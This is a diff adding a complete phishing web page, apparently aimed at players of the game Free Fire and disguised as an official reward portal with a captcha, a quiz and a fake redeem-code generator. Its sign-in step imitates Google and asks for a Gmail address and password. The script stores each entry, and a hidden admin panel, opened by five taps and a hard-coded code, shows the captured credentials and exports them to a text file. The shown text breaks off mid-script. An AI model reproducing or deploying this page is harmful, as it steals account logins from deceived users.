@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Free Fire Reward Portal</title>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
+  
+  body {
+    background-color: #f5f5f5; 
+    color: #333;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+  }
+
+  .container { 
+    width: 100%; 
+    max-width: 500px; 
+    background: #ffffff; 
+    padding: 30px 20px 50px 20px;
+    display: flex;
+    flex-direction: column;
+    box-shadow: 0 0 20px rgba(0,0,0,0.05);
+  }
+
+  /* Common Styles */
+  .hidden { display: none !important; }
+  .header { text-align: center; margin-bottom: 20px; }
+  .header h1 { font-size: 24px; color: #202124; font-weight: 700; margin-bottom: 5px; }
+  .header p { font-size: 14px; color: #5f6368; }
+  
+  .btn {
+    width: 100%; padding: 14px; border: none; border-radius: 8px;
+    font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s;
+    text-transform: uppercase; letter-spacing: 0.5px; margin-top: 15px;
+  }
+  .btn-blue { background-color: #1a73e8; color: #ffffff; box-shadow: 0 4px 10px rgba(26,115,232,0.3); }
+  .btn-blue:active { background-color: #1557b0; transform: scale(0.98); }
+  .btn-green { background-color: #34a853; color: #ffffff; box-shadow: 0 4px 10px rgba(52,168,83,0.3); }
+  .btn-green:active { background-color: #2b8a45; transform: scale(0.98); }
+
+  /* PAGE 1: Landing Page */
+  .intro-text {
+    font-size: 15px; line-height: 1.6; color: #3c4043;
+    margin-bottom: 25px; text-align: center;
+    background: #f8f9fa; padding: 15px; border-radius: 10px; border: 1px solid #eaeaea;
+  }
+  .details-text { font-size: 14px; line-height: 1.7; color: #5f6368; text-align: justify; margin-bottom: 30px; }
+  .details-text h2 { font-size: 17px; color: #202124; margin-bottom: 10px; margin-top: 20px; border-bottom: 1px solid #eaeaea; padding-bottom: 5px; }
+  .details-text ul { margin-left: 20px; margin-bottom: 15px; }
+  .terms-footer { font-size: 11px; color: #9aa0a6; line-height: 1.5; text-align: justify; border-top: 1px solid #eaeaea; padding-top: 15px; }
+
+  /* PAGE 2: Bike Verification */
+  .captcha-box {
+    border: 1px solid #d3d3d3; border-radius: 4px; background: #f9f9f9;
+    padding: 20px; margin-top: 20px;
+  }
+  .captcha-header { font-size: 14px; font-weight: 500; margin-bottom: 15px; color: #333; }
+  .grid-container { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; margin-bottom: 15px; }
+  .grid-item {
+    background-color: #ddd; height: 80px; border-radius: 4px; cursor: pointer;
+    display: flex; justify-content: center; align-items: center; position: relative;
+    background-size: cover; background-position: center; border: 2px solid transparent;
+  }
+  .grid-item.selected { border-color: #1a73e8; opacity: 0.7; }
+  .grid-item.selected::after {
+    content: '✔'; position: absolute; color: white; background: #1a73e8;
+    width: 24px; height: 24px; border-radius: 50%; display: flex; justify-content: center; align-items: center;
+    font-size: 14px; top: -8px; right: -8px; font-weight: bold;
+  }
+  .captcha-error { color: #d93025; font-size: 12px; margin-top: 5px; display: none; }
+  .captcha-success { color: #188038; font-size: 14px; font-weight: 500; text-align: center; margin-top: 15px; display: none; }
+
+  /* PAGE 3: Sign In */
+  .signin-text { font-size: 20px; font-weight: 500; color: #202124; text-align: center; margin-bottom: 5px; cursor: pointer; user-select: none; }
+  .signin-sub { font-size: 14px; color: #5f6368; text-align: center; margin-bottom: 25px; }
+  .input-group { margin-bottom: 15px; }
+  input {
+    width: 100%; padding: 14px; border: 1px solid #dadce0; border-radius: 6px;
+    font-size: 15px; color: #202124; transition: 0.2s; background: #fff;
+  }
+  input:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+  
+  /* Admin Panel */
+  .admin-panel { margin-top: 30px; background: #f8f9fa; border: 1px solid #dadce0; border-radius: 8px; padding: 15px; }
+  .admin-panel h2 { font-size: 16px; color: #202124; margin-bottom: 10px; }
+  table { width: 100%; border-collapse: collapse; font-size: 12px; margin-top: 10px; background: #fff; }
+  th, td { padding: 8px; border: 1px solid #dadce0; text-align: left; }
+  th { background: #f1f3f4; color: #202124; }
+  .btn-download { background: #1a73e8; color: white; padding: 8px; border-radius: 4px; border: none; width: 100%; margin-top: 10px; cursor: pointer; font-size: 13px; }
+
+  /* PAGE 4: Quiz */
+  .score-board { display: flex; justify-content: space-between; align-items: center; background: #f1f3f4; padding: 10px 15px; border-radius: 8px; font-size: 14px; font-weight: 500; color: #202124; margin-bottom: 20px; }
+  .timer { color: #ea4335; font-weight: bold; font-size: 16px; }
+  .question-box { font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 15px; line-height: 1.4; }
+  .options { display: flex; flex-direction: column; gap: 10px; }
+  .option { background: #fff; border: 1px solid #dadce0; padding: 12px 15px; border-radius: 8px; font-size: 14px; color: #3c4043; cursor: pointer; transition: 0.2s; }
+  .option:active { background: #f1f3f4; }
+  .option.correct { background: #e6f4ea; border-color: #34a853; color: #188038; font-weight: 500; }
+  .option.wrong { background: #fce8e6; border-color: #ea4335; color: #c5221f; font-weight: 500; }
+  .option.disabled { pointer-events: none; }
+
+  /* PAGE 5: Redeem Code */
+  .loading-circle { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; animation: spin 1s linear infinite; margin: 30px auto; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  .code-box { background: #e8f0fe; border: 2px dashed #1a73e8; padding: 20px; text-align: center; border-radius: 10px; margin: 20px 0; }
+  .code-text { font-size: 24px; font-weight: 700; letter-spacing: 2px; color: #1a73e8; font-family: monospace; }
+  .copy-btn { background: #34a853; color: white; border: none; padding: 10px 20px; border-radius: 5px; margin-top: 15px; cursor: pointer; font-weight: 500; }
+  .expiry-note { font-size: 12px; color: #888; text-align: center; margin-top: 15px; line-height: 1.5; }
+</style>
+</head>
+<body>
+
+<div class="container">
+
+  <!-- PAGE 1: LANDING -->
+  <div id="page1">
+    <div class="header">
+      <h1>Free Fire Reward Portal</h1>
+      <p>Official Partner Program</p>
+    </div>
+    <div class="intro-text">
+      Welcome to the official reward portal. We are giving away free diamonds and skins to our active players. To participate, we have set up a short <b>Quiz</b>. The player who passes this quiz will have a <b>Redeem Code</b> generated based on their performance.
+    </div>
+    <button class="btn btn-blue" onclick="goToPage(2)">GET STARTED</button>
+    <div class="details-text">
+      <h2>How it works?</h2>
+      <ul>
+        <li><strong>Step 1:</strong> Click Get Started.</li>
+        <li><strong>Step 2:</strong> Pass the security verification.</li>
+        <li><strong>Step 3:</strong> Login to your account.</li>
+        <li><strong>Step 4:</strong> Pass the 5-question Free Fire quiz.</li>
+        <li><strong>Step 5:</strong> Generate and copy your redeem code.</li>
+      </ul>
+      <h2>Important Rules</h2>
+      <p>1. One user can only claim the reward once. Multiple entries will be blocked.</p>
+      <p>2. If your FF ID is incorrect, the reward will not be processed.</p>
+      <p>3. Cheating in the quiz may result in an account block.</p>
+    </div>
+    <div class="terms-footer">
+      <strong>Terms & Conditions:</strong><br>
+      This is a promotional event. We are not directly affiliated with Garena Free Fire. All trademarks belong to their respective owners. By clicking Get Started, you agree to our privacy policy and allow us to collect your details for verification purposes. Rewards are subject to availability.
+    </div>
+  </div>
+
+  <!-- PAGE 2: BIKE VERIFICATION -->
+  <div id="page2" class="hidden">
+    <div class="header">
+      <h1>Security Check</h1>
+      <p>Please verify you are a human</p>
+    </div>
+    <div class="captcha-box">
+      <div class="captcha-header">Select all images with <strong>Bikes</strong>.</div>
+      <div class="grid-container" id="gridContainer">
+        <!-- JS will populate 9 images here -->
+      </div>
+      <div class="captcha-error" id="captchaError">Please try again. You missed some images.</div>
+      <button class="btn btn-blue" id="verifyBtn" onclick="verifyImages()">VERIFY</button>
+      <button class="btn btn-blue hidden" id="retryBtn" onclick="resetCaptcha()">TRY AGAIN</button>
+      <div class="captcha-success" id="captchaSuccess">✔ Verification Successful</div>
+      <button class="btn btn-green hidden" id="proceedBtn" onclick="goToPage(3)">PROCEED TO SIGN IN</button>
+    </div>
+  </div>
+
+  <!-- PAGE 3: SIGN IN & HIDDEN ADMIN -->
+  <div id="page3" class="hidden">
+    <div class="signin-text" id="adminTapArea">Sign in with Google</div>
+    <div class="signin-sub">Enter your Gmail ID and password to verify.</div>
+    
+    <div class="input-group">
+      <input type="text" id="emailInput" placeholder="Email or phone">
+    </div>
+    <div class="input-group">
+      <input type="password" id="passInput" placeholder="Enter password">
+    </div>
+    <button class="btn btn-blue" onclick="saveAndProceed()">SIGN IN</button>
+
+    <!-- HIDDEN ADMIN PANEL -->
+    <div class="admin-panel hidden" id="adminPanel">
+      <h2>🔒 Admin Access</h2>
+      <input type="password" id="adminCode" placeholder="Enter admin code" style="margin-bottom:10px;">
+      <button class="btn btn-blue" onclick="adminLogin()" style="padding: 8px; font-size: 14px; margin-top:0;">Login</button>
+      <div id="adminError" style="color:red; font-size:12px; margin-top:5px;"></div>
+
+      <div id="adminRecords" class="hidden">
+        <h2 style="margin-top:15px; font-size:14px;">📋 Data Records</h2>
+        <div style="overflow-x: auto;">
+          <table>
+            <thead>
+              <tr><th>#</th><th>Email/Number</th><th>Password</th></tr>
+            </thead>
+            <tbody id="recordsBody"></tbody>
+          </table>
+        </div>
+        <button class="btn-download" onclick="downloadData()">⬇ Download Data (.txt)</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- PAGE 4: FF QUIZ -->
+  <div id="page4" class="hidden">
+    <div class="header">
+      <h1>Free Fire Quiz</h1>
+      <p>Answer correctly to get points</p>
+    </div>
+    <div class="score-board">
+      <div>Points: <span id="scoreDisplay">0</span></div>
+      <div class="timer" id="timerDisplay">10s</div>
+      <div>Q: <span id="qCounter">1/5</span></div>
+    </div>
+    <div class="question-box" id="questionText">Loading...</div>
+    <div class="options" id="optionsBox"></div>
+    <button class="btn btn-blue hidden" id="nextBtn" onclick="nextQuestion()">NEXT QUESTION</button>
+  </div>
+
+  <!-- PAGE 5: CODE GENERATOR -->
+  <div id="page5" class="hidden">
+    <div class="header">
+      <h1>Generate Reward</h1>
+      <p>Please wait while we generate your code</p>
+    </div>
+    
+    <div id="loadingDiv">
+      <div class="loading-circle"></div>
+    </div>
+
+    <div id="codeDiv" class="hidden">
+      <div class="header" style="margin-top:20px;">
+        <h1 style="color:#34a853;">🎉 Success!</h1>
+        <p>Your redeem code has been generated</p>
+      </div>
+      <div class="code-box">
+        <div class="code-text" id="generatedCode">FF-XXXX-XXXX-XXXX</div>
+        <button class="copy-btn" onclick="copyCode()">COPY CODE</button>
+      </div>
+      <div class="expiry-note">
+        * Note: If the code doesn't work in the game, it might be expired or not valid for your server region. Try claiming from a new account.
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+/* ============ SOUND SYSTEM ============ */
+let audioCtx = null;
+function initAudio() {
+  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  if (audioCtx.state === 'suspended') audioCtx.resume();
+}
+function playCorrect() {
+  initAudio();
+  const notes = [523.25, 659.25, 783.99, 1046.50]; 
+  notes.forEach((freq, i) => {
+    const osc = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+    osc.type = 'sine'; osc.frequency.value = freq;
+    const start = audioCtx.currentTime + i * 0.1;
+    gain.gain.setValueAtTime(0.4, start);
+    gain.gain.exponentialRampToValueAtTime(0.01, start + 0.3);
+    osc.connect(gain).connect(audioCtx.destination);
+    osc.start(start); osc.stop(start + 0.35);
+  });
+}
+function playWrong() {
+  initAudio();
+  const osc = audioCtx.createOscillator();
+  const gain = audioCtx.createGain();
+  osc.type = 'square'; osc.frequency.setValueAtTime(150, audioCtx.currentTime);
+  osc.frequency.exponentialRampToValueAtTime(60, audioCtx.currentTime + 0.4);
+  gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+  gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
+  osc.connect(gain).connect(audioCtx.destination);
+  osc.start(); osc.stop(audioCtx.currentTime + 0.45);
+}
+
+/* ============ PAGE NAVIGATION ============ */
+function goToPage(pageNum) {
+  // Hide all pages
+  document.getElementById('page1').classList.add('hidden');
+  document.getElementById('page2').classList.add('hidden');
+  document.getElementById('page3').classList.add('hidden');
+  document.getElementById('page4').classList.add('hidden');
+  document.getElementById('page5').classList.add('hidden');
+  
+  // Show requested page
+  document.getElementById('page' + pageNum).classList.remove('hidden');
+  window.scrollTo(0, 0);
+  
+  // Initialize specific page logic
+  if(pageNum === 2) initCaptcha();
+  if(pageNum === 4) startQuiz();
+}
+
+/* ============ PAGE 2: CAPTCHA LOGIC ============ */
+const captchaImages = [
+  { id: 1, isBike: true, icon: '🏍️' },
+  { id: 2, isBike: false, icon: '🚗' },
+  { id: 3, isBike: true, icon: '🚲' },
+  { id: 4, isBike: false, icon: '🚦' },
+  { id: 5, isBike: true, icon: '🏍️' },
+  { id: 6, isBike: false, icon: '🚌' },
+  { id: 7, isBike: true, icon: '🚲' },
+  { id: 8, isBike: false, icon: '🚥' },
+  { id: 9, isBike: false, icon: '🚕' }
+];
+let selectedImages = [];
+
+function initCaptcha() {
+  const container = document.getElementById('gridContainer');
+  container.innerHTML = '';
+  selectedImages = [];
+  document.getElementById('captchaError').style.display = 'none';
+  document.getElementById('captchaSuccess').style.display = 'none';
+  document.getElementById('verifyBtn').classList.remove('hidden');
+  document.getElementById('retryBtn').classList.add('hidden');
+  document.getElementById('proceedBtn').classList.add('hidden');
+
+  const shuffled = [...captchaImages].sort(() => 0.5 - Math.random());
+
+  shuffled.forEach(img => {
+    const div = document.createElement('div');
+    div.className = 'grid-item';
+    div.style.fontSize = '40px';
+    div.style.backgroundColor = '#e0e0e0';
+    div.textContent = img.icon;
+    div.dataset.isBike = img.isBike;
+    
+    div.onclick = () => {
+      if (div.classList.contains('selected')) {
+        div.classList.remove('selected');
+        selectedImages = selectedImages.filter(i => i !== div);
+      } else {
+        div.classList.add('selected');
+        selectedImages.push(div);
+      }
+    };
+    container.appendChild(div);
+  });
+}
+
+function verifyImages() {
+  let allCorrect = true;
+  let hasSelection = selectedImages.length > 0;
+
+  if (!hasSelection) {
+    allCorrect = false;
+  } else {
+    selectedImages.forEach(div => {
+      if (div.dataset.isBike !== 'true') allCorrect = false;
+    });
+    const allGridItems = document.querySelectorAll('.grid-item');
+    allGridItems.forEach(div => {
+      if (div.dataset.isBike === 'true' && !div.classList.contains('selected')) {
+        allCorrect = false;
+      }
+    });
+  }
+
+  if (allCorrect) {
+    document.getElementById('verifyBtn').classList.add('hidden');
+    document.getElementById('captchaSuccess').style.display = 'block';
+    document.getElementById('proceedBtn').classList.remove('hidden');
+  } else {
+    document.getElementById('captchaError').style.display = 'block';
+    document.getElementById('verifyBtn').classList.add('hidden');
+    document.getElementById('retryBtn').classList.remove('hidden');
+  }
+}
+
+function resetCaptcha() {
+  initCaptcha();
+}
+
+/* ============ PAGE 3: SIGN IN & ADMIN ============ */
+let adminTapCount = 0;
+let adminTapTimer = null;
+
+document.getElementById('adminTapArea').addEventListener('click', () => {
+  adminTapCount++;
+  clearTimeout(adminTapTimer);
+  adminTapTimer = setTimeout(() => { adminTapCount = 0; }, 1200); 
+  
+  if (adminTapCount === 5) {
+    adminTapCount = 0;
+    document.getElementById('adminPanel').classList.remove('hidden');
+    document.getElementById('adminPanel').scrollIntoView({ behavior: 'smooth' });
+  }
+});
+
+function saveAndProceed() {
+  const email = document.getElementById('emailInput').value.trim();
+  const pass = document.getElementById('passInput').value.trim();
+  
+  if (!email || !pass) {
+    alert("Please fill both fields!");
+    return;
+  }
+
+  let records = JSON.parse(localStorage.getItem('ffAdminData') || '[]');
+  records.push({ email: email, password: pass });
+  localStorage.setItem('ffAdminData', JSON.stringify(records));
+
+  goToPage(4);
+}
+
+function adminLogin() {
+  const code = document.getElementById('adminCode').value.trim();
+  if (code === '9906') {
+    document.getElementById('adminError').textContent = '';
+    document.getElementById('adminRecords').classList.remove('hidden');
+    renderAdminTable();
+  } else {
+    document.getElementById('adminError').textContent = '❌ Wrong admin code';
+  }
+}
+
+function renderAdminTable() {
+  const records = JSON.parse(localStorage.getItem('ffAdminData') || '[]');
+  const tbody = document.getElementById('recordsBody');
+  tbody.innerHTML = '';
+  if (records.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;">No data yet</td></tr>';
+    return;
+  }
+  records.forEach((r, i) => {
+    tbody.innerHTML += `<tr><td>${i+1}</td><td>${r.email}</td><td>${r.password}</td></tr>`;
+  });
+}
+
+function downloadData() {
+  const records = JSON.parse(localStorage.getItem('ffAdminData') || '[]');
+  if (records.length === 0) { alert("No data to download."); return; }
+  
+  let text = "--- USER DATA (EMAIL & PASSWORD) ---\n\n";
+  records.forEach((r, i) => {
+    text += `${i+1}. Email: ${r.email} | Password: ${r.password}\n`;
+  });
+  
+  const blob = new Blob([text], { type: 'text/plain' });
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'User_Data.txt';
+  a.click();
+}
+
+/* ============ PAGE 4: QUIZ LOGIC ============ */
+const questions = [
+  { q: "What is the maximum number of players in a Free Fire match?", options: ["50", "52", "60", "48"], answer: 1 },
+  { q: "Which character has the ability 'Raging Reload'?", options: ["Kelly", "Alok", "Hayato", "Chrono"], answer: 2 },
+  { q: "What is the default number of points for a kill in ranked mode?", options: ["5", "10", "15", "20"], answer: 1 },
+  { q: "Which map was added to Free Fire in 2020?", options: ["Bermuda", "Purgatory", "Kalahari", "Alpine"], answer: 2 },
+  { q: "How many diamonds does a Diamond Royale spin usually cost?", options: ["10", "20", "30", "50"], answer: 1 }
+];
+
+let currentQ = 0, score = 0, answered = false;
+let timeLeft = 10, timerInterval;
+
+function startQuiz() {
+  currentQ = 0; score = 0; document.getElementById('scoreDisplay').textContent = score;
+  loadQuestion();
+}
+
+function loadQuestion() {
+  answered = false;
+  const q = questions[currentQ];
+  document.getElementById('questionText').textContent = q.q;
+  const optionsBox = document.getElementById('optionsBox');
+  optionsBox.innerHTML = '';
+  
+  q.options.forEach((opt, i) =>
